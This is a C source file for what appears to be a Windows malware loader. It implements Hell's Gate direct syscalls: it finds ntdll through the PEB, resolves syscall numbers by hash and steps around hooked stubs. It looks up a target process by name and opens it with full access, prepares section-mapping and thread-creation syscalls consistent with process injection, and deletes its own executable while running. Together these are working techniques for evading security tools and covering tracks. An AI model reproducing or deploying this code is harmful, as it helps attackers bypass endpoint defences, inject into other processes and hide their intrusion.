#include "HellsGate.h"

BOOL GetImageExportDirectory(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY* ppImageExportDirectory) {
	// Get DOS header
	PIMAGE_DOS_HEADER pImageDosHeader = (PIMAGE_DOS_HEADER)pModuleBase;
	if (pImageDosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
		return FALSE;
	}

	// Get NT headers
	PIMAGE_NT_HEADERS pImageNtHeaders = (PIMAGE_NT_HEADERS)((PBYTE)pModuleBase + pImageDosHeader->e_lfanew);
	if (pImageNtHeaders->Signature != IMAGE_NT_SIGNATURE) {
		return FALSE;
	}

	// Get the EAT
	*ppImageExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)pModuleBase + pImageNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
	return TRUE;
}

BOOL GetVxTableEntry(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY pImageExportDirectory, PVX_TABLE_ENTRY pVxTableEntry) {
	PDWORD pdwAddressOfFunctions = (PDWORD)((PBYTE)pModuleBase + pImageExportDirectory->AddressOfFunctions);
	PDWORD pdwAddressOfNames = (PDWORD)((PBYTE)pModuleBase + pImageExportDirectory->AddressOfNames);
	PWORD pwAddressOfNameOrdinales = (PWORD)((PBYTE)pModuleBase + pImageExportDirectory->AddressOfNameOrdinals);

	for (WORD cx = 0; cx < pImageExportDirectory->NumberOfNames; cx++) {
		PCHAR pczFunctionName = (PCHAR)((PBYTE)pModuleBase + pdwAddressOfNames[cx]);
		PVOID pFunctionAddress = (PBYTE)pModuleBase + pdwAddressOfFunctions[pwAddressOfNameOrdinales[cx]];

		if (RTIME_HASH(pczFunctionName) == pVxTableEntry->dwHash) {
			pVxTableEntry->pAddress = pFunctionAddress;

			// Quick and dirty fix in case the function has been hooked
			WORD cw = 0;
			while (TRUE) {
				// check if syscall, in this case we are too far
				if (*((PBYTE)pFunctionAddress + cw) == 0x0f && *((PBYTE)pFunctionAddress + cw + 1) == 0x05)
					return FALSE;

				// check if ret, in this case we are also probaly too far
				if (*((PBYTE)pFunctionAddress + cw) == 0xc3)
					return FALSE;

				// First opcodes should be :
				//    MOV R10, RCX
				//    MOV RCX, <syscall>
				if (*((PBYTE)pFunctionAddress + cw) == 0x4c
					&& *((PBYTE)pFunctionAddress + 1 + cw) == 0x8b
					&& *((PBYTE)pFunctionAddress + 2 + cw) == 0xd1
					&& *((PBYTE)pFunctionAddress + 3 + cw) == 0xb8
					&& *((PBYTE)pFunctionAddress + 6 + cw) == 0x00
					&& *((PBYTE)pFunctionAddress + 7 + cw) == 0x00) {
					BYTE high = *((PBYTE)pFunctionAddress + 5 + cw);
					BYTE low = *((PBYTE)pFunctionAddress + 4 + cw);
					pVxTableEntry->wSystemCall = (high << 8) | low;
					break;
				}

				cw++;
			};
		}
	}

	return TRUE;
}

VX_TABLE g_SyscallsTable = { 0 };

BOOL InitializeSyscalls() {
	printf("[i] Initializing Syscalls Table...\n");

	// Get the PEB
	PTEB pCurrentTeb = RtlGetThreadEnvironmentBlock();
	PPEB pCurrentPeb = pCurrentTeb->ProcessEnvironmentBlock;
	if (!pCurrentPeb || !pCurrentTeb || pCurrentPeb->OSMajorVersion != 0xA)
		return FALSE;

	// Get NTDLL module 
	PLDR_DATA_TABLE_ENTRY pLdrDataEntry = (PLDR_DATA_TABLE_ENTRY)((PBYTE)pCurrentPeb->LoaderData->InMemoryOrderModuleList.Flink->Flink - 0x10);
	PVOID ntDllBaseAddress = pLdrDataEntry->DllBase;
	if (!ntDllBaseAddress)
		return FALSE;

	// Get the EAT of NTDLL
	PIMAGE_EXPORT_DIRECTORY pImageExportDirectory = NULL;
	if (!GetImageExportDirectory(pLdrDataEntry->DllBase, &pImageExportDirectory) || pImageExportDirectory == NULL)
		return FALSE;

	// Initialize the syscalls table
	g_SyscallsTable.NtCreateSection.dwHash = NtCreateSectionHashValue;
	g_SyscallsTable.NtMapViewOfSection.dwHash = NtMapViewOfSectionHashValue;
	g_SyscallsTable.NtUnmapViewOfSection.dwHash = NtUnmapViewOfSectionHashValue;
	g_SyscallsTable.NtClose.dwHash = NtCloseHashValue;
	g_SyscallsTable.NtCreateThreadEx.dwHash = NtCreateThreadExHashValue;
	g_SyscallsTable.NtWaitForSingleObject.dwHash = NtWaitForSingleObjectHashValue;
	g_SyscallsTable.NtQuerySystemInformation.dwHash = NtQuerySystemInformationHashValue;

	if (!GetVxTableEntry(ntDllBaseAddress, pImageExportDirectory, &g_SyscallsTable.NtCreateSection))
		return FALSE;
	if (!GetVxTableEntry(ntDllBaseAddress, pImageExportDirectory, &g_SyscallsTable.NtMapViewOfSection))
		return FALSE;
	if (!GetVxTableEntry(ntDllBaseAddress, pImageExportDirectory, &g_SyscallsTable.NtUnmapViewOfSection))
		return FALSE;
	if (!GetVxTableEntry(ntDllBaseAddress, pImageExportDirectory, &g_SyscallsTable.NtClose))
		return FALSE;
	if (!GetVxTableEntry(ntDllBaseAddress, pImageExportDirectory, &g_SyscallsTable.NtCreateThreadEx))
		return FALSE;
	if (!GetVxTableEntry(ntDllBaseAddress, pImageExportDirectory, &g_SyscallsTable.NtWaitForSingleObject))
		return FALSE;
	if (!GetVxTableEntry(ntDllBaseAddress, pImageExportDirectory, &g_SyscallsTable.NtQuerySystemInformation))
		return FALSE;

	printf("[+] DONE!\n");
	//printf("[+] SSN Of The NtCreateSection: %d\n", g_SyscallsTable.NtCreateSection.wSystemCall);
	//printf("[+] SSN Of The NtMapViewOfSection: %d\n", g_SyscallsTable.NtMapViewOfSection.wSystemCall);
	//printf("[+] SSN Of The NtUnmapViewOfSection: %d\n", g_SyscallsTable.NtUnmapViewOfSection.wSystemCall);
	//printf("[+] SSN Of The NtClose: %d\n", g_SyscallsTable.NtClose.wSystemCall);
	//printf("[+] SSN Of The NtCreateThreadEx: %d\n", g_SyscallsTable.NtCreateThreadEx.wSystemCall);
	//printf("[+] SSN Of The NtWaitForSingleObject: %d\n", g_SyscallsTable.NtWaitForSingleObject.wSystemCall);
	//printf("[+] SSN Of The NtQuerySystemInformation: %d\n", g_SyscallsTable.NtQuerySystemInformation.wSystemCall);

	return TRUE;
}

BOOL GetRemoteProcessHandle(IN LPCWSTR szProcName, IN DWORD* pdwPid, IN HANDLE* phProcess)
{
	ULONG							uReturnLen1 = 0;
	ULONG							uReturnLen2 = 0;
	PSYSTEM_PROCESS_INFORMATION		SystemProcInfo = NULL;
	NTSTATUS						status = 0;

	// First NtQuerySystemInformation call
	// This will fail with STATUS_INFO_LENGTH_MISMATCH
	// But it will provide information about how much memory to allocate (uReturnLen1)
	HellsGate(g_SyscallsTable.NtQuerySystemInformation.wSystemCall);
	HellDescent(SystemProcessInformation, NULL, NULL, &uReturnLen1);

	// Allocating enough buffer for the returned array of `SYSTEM_PROCESS_INFORMATION` struct
	SystemProcInfo = (PSYSTEM_PROCESS_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, uReturnLen1);
	if (SystemProcInfo == NULL) {
		printf("[!] HeapAlloc Failed With Error :  0x%0.8X\n", GetLastError());
		return FALSE;
	}

	// Second NtQuerySystemInformation call
	// Calling NtQuerySystemInformation with the correct arguments, the output will be saved to 'SystemProcInfo'
	HellsGate(g_SyscallsTable.NtQuerySystemInformation.wSystemCall);
	if ((status = HellDescent(SystemProcessInformation, SystemProcInfo, uReturnLen1, &uReturnLen2) != 0x0)) {
		printf("[!] HellDescent Failed With Error :  0x%0.8X\n", status);
		return FALSE;
	}
	printf("[+] Retrieved SystemProcInfo Structure At %p with Actual Retrieved Size: %d\n", SystemProcInfo, uReturnLen2);

	// Since we will modify 'SystemProcInfo', we will save its initial value before the while loop to free it later
	PSYSTEM_PROCESS_INFORMATION pValueToFree = SystemProcInfo;

	// 'SystemProcInfo' will now represent a new element in the array
	SystemProcInfo = (PSYSTEM_PROCESS_INFORMATION)((ULONG_PTR)SystemProcInfo + SystemProcInfo->NextEntryOffset);

	while (TRUE) {
		// Small check for the process's name size
		// Comparing the enumerated process name to what we want to target
		LPCWSTR lowerCaseTargetProcName = LowerCaseStringW(szProcName);
		LPCWSTR lowerCaseProcName = LowerCaseStringW(SystemProcInfo->ImageName.Buffer);
		if (SystemProcInfo->ImageName.Length && StringCompareW(lowerCaseTargetProcName, lowerCaseProcName) == 0) {
			*pdwPid = (DWORD)SystemProcInfo->UniqueProcessId;
			*phProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, (DWORD)SystemProcInfo->UniqueProcessId);
			break;
		}

		// If NextEntryOffset is 0, we reached the end of the array
		if (SystemProcInfo->NextEntryOffset == 0)
			break;

		// Move to the next element in the array
		SystemProcInfo = (PSYSTEM_PROCESS_INFORMATION)((ULONG_PTR)SystemProcInfo + SystemProcInfo->NextEntryOffset);
	}

	HeapFree(GetProcessHeap(), 0, pValueToFree);

	// Check if we successfully got the target process handle
	if (*pdwPid == NULL || *phProcess == NULL)
		return FALSE;
	else
		return TRUE;
}

BOOL SelfDelete() {
	NTSTATUS status = 0;

	DWORD dwFilePathBufferSize = MAX_PATH * 2;
	LPWSTR pFilePathBuffer = (LPWSTR)HeapAlloc(
		GetProcessHeap(),
		HEAP_ZERO_MEMORY,
		dwFilePathBufferSize * sizeof(WCHAR)
	);
	if (!pFilePathBuffer) {
		printf("[!] HeapAlloc Failed With Error: 0x%0.8X \n", GetLastError());
		return FALSE;
	}

	// Get the path of the current executable
	if (!GetModuleFileNameW(NULL, pFilePathBuffer, dwFilePathBufferSize)) {
		printf("[!] GetModuleFileNameW Failed With Error: 0x%0.8X \n", GetLastError());
		return FALSE;
	}
	//wprintf(L"[+] FilePath: %ls\n", pFilePathBuffer);

	// Opening a handle to the current file
	HANDLE hFile = CreateFileW(
		pFilePathBuffer,
		DELETE | SYNCHRONIZE,
		FILE_SHARE_READ,
		NULL,
		OPEN_EXISTING,
		NULL,
		NULL
	);
	if (hFile == INVALID_HANDLE_VALUE) {
		printf("[!] CreateFileW Failed With Error: 0x%0.8X \n", GetLastError());
		return FALSE;
	}

	// The new data stream name
	PCWSTR NewStream = (PCWSTR)NEW_STREAM;
	SIZE_T NewStreamSize = StringLengthW(NewStream) * sizeof(WCHAR);
	SIZE_T sFileRenameInfo = sizeof(FILE_RENAME_INFO) + NewStreamSize;

	// Allocating enough buffer for the 'FILE_RENAME_INFO' structure
	PFILE_RENAME_INFORMATION pFileRenameInfo = (PFILE_RENAME_INFORMATION)HeapAlloc(
		GetProcessHeap(),
		HEAP_ZERO_MEMORY,
		sFileRenameInfo
	);
	if (!pFileRenameInfo) {
		printf("[!] HeapAlloc Failed With Error : 0x%0.8X \n", GetLastError());
		return FALSE;
	}

	// Setting the new data stream name buffer and size in the 'FILE_RENAME_INFO' structure
	pFileRenameInfo->FileNameLength = (DWORD)NewStreamSize;
	CopyMemory(pFileRenameInfo->FileName, NewStream, pFileRenameInfo->FileNameLength);

	// Renaming the data stream
	if (!SetFileInformationByHandle(
		hFile,
		FileRenameInfo,
		pFileRenameInfo,
		(DWORD)sFileRenameInfo
	)) {
		printf("[!] SetFileInformationByHandle [R] Failed With Error: 0x%0.8X \n", GetLastError());
		return FALSE;
	}

	// Closing the file handle
	HellsGate(g_SyscallsTable.NtClose.wSystemCall);
	if ((status = HellDescent(hFile)) != 0x0) {
		printf("[!] NtClose Failed With Error : 0x%0.8X \n", status);
		return FALSE;
	}

	// Re-opening a handle to the current file for refreshing
	hFile = CreateFileW(
		pFilePathBuffer,
		DELETE | SYNCHRONIZE,
		FILE_SHARE_READ,
		NULL,
		OPEN_EXISTING,
		NULL,
		NULL
	);
	if (hFile == INVALID_HANDLE_VALUE && GetLastError() == ERROR_FILE_NOT_FOUND) {
		return TRUE;
	}
	if (hFile == INVALID_HANDLE_VALUE) {
		printf("[!] CreateFileW Failed With Error: 0x%0.8X \n", GetLastError());
		return FALSE;
	}

	// Marking the file for deletion (used in the 2nd SetFileInformationByHandle call) 
	FILE_DISPOSITION_INFO fileDispositionInfo = {
		.DeleteFile = TRUE
	};

	// Marking for deletion after the file's handle is closed
	if (!SetFileInformationByHandle(
		hFile,
		FileDispositionInfo,
		&fileDispositionInfo,
		sizeof(fileDispositionInfo)
	)) {
		printf("[!] SetFileInformationByHandle [D] Failed With Error : 0x%0.8X \n", GetLastError());
		return FALSE;
	}

	// Close the handle for deleting the file
	HellsGate(g_SyscallsTable.NtClose.wSystemCall);
	if ((status = HellDescent(hFile)) != 0x0) {
		printf("[!] NtClose Failed With Error : 0x%0.8X \n", status);
		return FALSE;
	}

	HeapFree(GetProcessHeap(), 0, pFilePathBuffer);
	HeapFree(GetProcessHeap(), 0, pFileRenameInfo);

	return TRUE;
}